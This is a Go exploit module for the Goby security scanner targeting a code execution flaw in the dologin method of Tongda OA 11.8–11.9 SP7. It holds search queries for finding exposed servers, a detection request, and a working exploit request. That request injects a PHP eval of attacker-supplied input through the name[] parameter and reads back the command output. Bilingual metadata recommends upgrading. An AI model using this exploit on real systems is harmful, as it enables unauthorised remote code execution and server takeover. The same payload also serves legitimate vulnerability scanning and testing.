package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Tongda OA 11.9 SP7 dologin method Code Execution Vulnerability",
    "Description": "<p>Tongda OA office system is a simple and practical collaborative office OA system developed by Beijing Tongda Xinke Technology Co., Ltd.</p><p>There is a code execution vulnerability in the dologin method of Tongda OA11.9 (including the SP7 patch), and attackers can execute arbitrary code through the vulnerability and obtain server permissions. The scope of such code execution vulnerability (11.8-11.9sp7).</p>",
    "Product": "Tongda OA",
    "Homepage": "https://www.tongda2000.com/",
    "DisclosureDate": "2022-08-10",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\"",
    "GobyQuery": "body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\"",
    "Level": "3",
    "Impact": "<p>There is a code execution vulnerability in the dologin method of Tongda OA11.9 (including the SP7 patch), and attackers can execute arbitrary code through the vulnerability and obtain server permissions. The scope of such code execution vulnerability (11.8-11.9sp7).</p>",
    "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version of 11.x or 12.x : <a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2. Deploy a Web application firewall to monitor database operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
    "References": [
        "https://www.tongda2000.com/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "code",
            "type": "input",
            "value": "echo \"123456789\";",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5(123)),//",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5(123)).eval(stripslashes($_REQUEST[8])).print_r(md5(123)),//",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "8={{{code}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|7152d234b70(.*?)202cb9"
            ]
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "通达 oa 协同办公系统 11.9 SP7 dologin 方法代码执行漏洞",
            "Product": "TDXK-通达OA",
            "Description": "<p>通达OA办公系统是由<span style=\"color: rgb(62, 62, 62);\">北京通达信科科技有限公司开发的一款<span style=\"color: rgb(62, 62, 62);\">简洁实用的协同办公OA系统。</span></span></p><p><font color=\"#3e3e3e\">通达OA11.9版本(包含SP7补丁)的dologin方法存在代码执行漏洞，攻击者可以通过漏洞执行任意代码，获取服务器权限，此类代码执行型漏洞影响范围（11.8-11.9sp7）。</font><span style=\"color: rgb(62, 62, 62);\"><span style=\"color: rgb(62, 62, 62);\"><br></span></span></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户升级至11.x或者12.x最新版：<a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">通达OA11.9版本(包含SP7补丁)的dologin方法存在代码执行漏洞，攻击者可以通过漏洞执行任意代码，获取服务器权限，此类代码执行型漏洞影响范围（11.8-11.9sp7）。</span><br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Tongda OA 11.9 SP7 dologin method Code Execution Vulnerability",
            "Product": "Tongda OA",
            "Description": "<p>Tongda OA office system is a simple and practical collaborative office OA system developed by Beijing Tongda Xinke Technology Co., Ltd.</p><p>There is a code execution vulnerability in the dologin method of Tongda OA11.9 (including the SP7 patch), and attackers can execute arbitrary code through the vulnerability and obtain server permissions. The scope of such code execution vulnerability (11.8-11.9sp7).<br></p>",
            "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version of 11.x or 12.x : <a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2. Deploy a Web application firewall to monitor database operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
            "Impact": "<p>There is a code execution vulnerability in the dologin method of Tongda OA11.9 (including the SP7 patch), and attackers can execute arbitrary code through the vulnerability and obtain server permissions. The scope of such code execution vulnerability (11.8-11.9sp7).<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10708"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}